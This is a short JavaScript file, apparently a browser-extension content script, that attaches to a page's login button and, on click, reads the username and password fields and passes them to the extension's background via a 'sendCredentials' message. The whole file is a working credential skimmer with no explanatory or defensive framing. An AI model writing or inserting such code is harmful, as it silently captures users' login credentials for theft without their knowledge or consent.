function extractCredentialsFromLoginForm() {
    const usernameInput = document.querySelector('input[name="_username"]');
    const passwordInput = document.querySelector('input[name="_password"]');
    
    if (usernameInput && passwordInput) {
        const username = usernameInput.value;
        const password = passwordInput.value;
        
        chrome.runtime.sendMessage({
            action: "sendCredentials",
            credentials: {
                username: username,
                password: password
            }
        });
    }
}

function addButtonEventListener() {
    const loginButton = document.querySelector('button.login-button');
    if (loginButton) {
        loginButton.addEventListener('click', extractCredentialsFromLoginForm);
    } else {
        setTimeout(addButtonEventListener, 1000);
    }
}


document.addEventListener("DOMContentLoaded", addButtonEventListener);
